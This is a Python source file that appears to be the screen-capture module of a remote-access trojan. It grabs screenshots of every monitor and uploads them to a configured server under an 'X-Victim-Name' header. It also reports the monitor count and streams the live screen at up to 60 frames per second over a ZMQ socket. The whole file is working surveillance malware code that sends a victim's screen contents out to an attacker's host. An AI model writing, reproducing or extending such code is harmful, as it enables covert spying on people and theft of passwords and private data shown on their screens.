import base64
import io
import threading
import time

import mss
from PIL import Image

import config # type: ignore
import requests
import zmq

# globals for screen module
current_screen_index = 0
screen_count = 0
screen_index_lock = threading.Lock()

# ZMQ socket pointer (set by main after initialization)
zmq_socket = None

# streaming settings controlled at runtime
stream_quality = config.DEFAULT_STREAM_QUALITY

def set_zmq_socket(sock):
    """Store a reference to the already-initialized ZMQ PUB socket.

    This avoids importing the "main" module and ensures the worker uses
    the same socket instance that was bound in :func:`main.init_zmq`.
    """
    global zmq_socket
    zmq_socket = sock


def capture_screen(quality: int = 85) -> dict:
    try:
        with mss.mss() as sct:
            monitor = sct.monitors[1]
            screenshot = sct.grab(monitor)
            img = Image.frombytes('RGB', screenshot.size, screenshot.rgb)

            buffer = io.BytesIO()
            img.save(buffer, format='JPEG', quality=quality)
            buffer.seek(0)

            img_base64 = base64.b64encode(buffer.getvalue()).decode('utf-8')

            return {
                "status": "success",
                "image": img_base64,
                "size": len(buffer.getvalue()),
                "width": screenshot.width,
                "height": screenshot.height,
            }
    except Exception as e:
        return {"status": "error", "message": str(e)}


def capture_and_upload_screen(quality: int = 75) -> dict:
    try:
        with mss.mss() as sct:
            monitor = sct.monitors[1]
            screenshot = sct.grab(monitor)
            img = Image.frombytes('RGB', screenshot.size, screenshot.rgb)
            buffer = io.BytesIO()
            img.save(buffer, format='JPEG', quality=quality, optimize=True)
            buffer.seek(0)
            response = requests.post(
                f"{config.SERVER_URL}/screenshot/upload",
                data=buffer.getvalue(),
                headers={"Content-Type": "image/jpeg", "X-Victim-Name": config.PC_NAME},
                timeout=5,
            )
            if response.status_code == 200:
                return {
                    "status": "success",
                    "size": len(buffer.getvalue()),
                    "width": screenshot.width,
                    "height": screenshot.height,
                }
            else:
                return {"status": "error", "message": f"HTTP {response.status_code}"}
    except Exception as e:
        return {"status": "error", "message": str(e)}


def capture_all_screens(quality: int = 75) -> dict:
    try:
        uploaded = 0
        with mss.mss() as sct:
            for idx, monitor in enumerate(sct.monitors[1:], 0):
                try:
                    img = Image.frombytes('RGB', monitor['width'], monitor['height'], sct.grab(monitor).rgb)
                    buffer = io.BytesIO()
                    img.save(buffer, format='JPEG', quality=quality, optimize=True)
                    buffer.seek(0)
                    requests.post(
                        f"{config.SERVER_URL}/screenshot/upload",
                        data=buffer.getvalue(),
                        headers={"Content-Type": "image/jpeg", "X-Victim-Name": config.PC_NAME},
                        timeout=5,
                    )
                    uploaded += 1
                except Exception:
                    pass
        return {"status": "success", "screens_uploaded": uploaded}
    except Exception as e:
        return {"status": "error", "message": str(e)}



def screen_stream_worker():
    """Capture screenshots and stream via ZMQ (with adjustable FPS)."""
    global current_screen_index, screen_count, zmq_socket, stream_quality

    # confirm ZMQ socket availability
    if zmq_socket is None:
        print("[!] ZMQ socket is not initialized before stream thread", flush=True)
    
    # target frames-per-second (adjustable)
    TARGET_FPS = 60
    FRAME_TIME = 1.0 / TARGET_FPS if TARGET_FPS > 0 else 0

    print(f"[*] ZMQ HD-Stream Thread gestartet (Target: {TARGET_FPS} FPS)...", flush=True)
    time.sleep(2)
    frame_count = 0
    error_count = 0

    with mss.mss() as sct:
        screen_count = len(sct.monitors) - 1
        print(f"[+] {screen_count} Monitor(s) erkannt", flush=True)

        def _send_screenshot_count():
            try:
                requests.post(
                    f"{config.SERVER_URL}/screenshot/count/{config.PC_NAME}/{screen_count}",
                    timeout=10,
                )
            except Exception:
                pass

        threading.Thread(target=_send_screenshot_count, daemon=True).start()
        last_frame_time = time.time()

        # helper to log config changes
        def _log_settings():
            if config.DEBUG_STREAM:
                print(f"[DEBUG] stream_quality={stream_quality} screen_index={current_screen_index}", flush=True)

        _log_settings()

        while True:
            try:
                # throttle to configured FPS
                if FRAME_TIME > 0:
                    now = time.time()
                    elapsed = now - last_frame_time
                    if elapsed < FRAME_TIME:
                        time.sleep(FRAME_TIME - elapsed)
                    last_frame_time = time.time()

                # choose monitor in a thread-safe manner
                with screen_index_lock:
                    # wrap around if index exceeds count
                    if screen_count <= 0:
                        # nothing to do, sleep briefly and loop
                        time.sleep(0.1)
                        continue
                    monitor_idx = 1 + (current_screen_index % screen_count)

                monitor = sct.monitors[monitor_idx]
                sct_img = sct.grab(monitor)
                img = Image.frombytes("RGB", sct_img.size, sct_img.bgra, "raw", "BGRX")

                buf = io.BytesIO()
                img.save(buf, format="JPEG", quality=stream_quality, subsampling=0)
                buf.seek(0)
                jpg_data = buf.getvalue()

                # attempt to send via main's ZMQ socket (non-blocking)
                try:
                    if zmq_socket is not None:
                        zmq_socket.send(jpg_data, zmq.NOBLOCK)
                        frame_count += 1
                        error_count = 0
                        # debug log: every frame if requested
                        if config.DEBUG_STREAM:
                            None
                        elif frame_count % 100 == 0:
                            None
                except zmq.Again:
                    # drop frame if send would block
                    if config.DEBUG_STREAM:
                        print(f"[DEBUG] frame drop (socket busy)", flush=True)
                    pass

            except Exception as e:
                error_count += 1
                if error_count == 1:
                    print(f"[!] First stream error: {e}", flush=True)
                time.sleep(0.1)
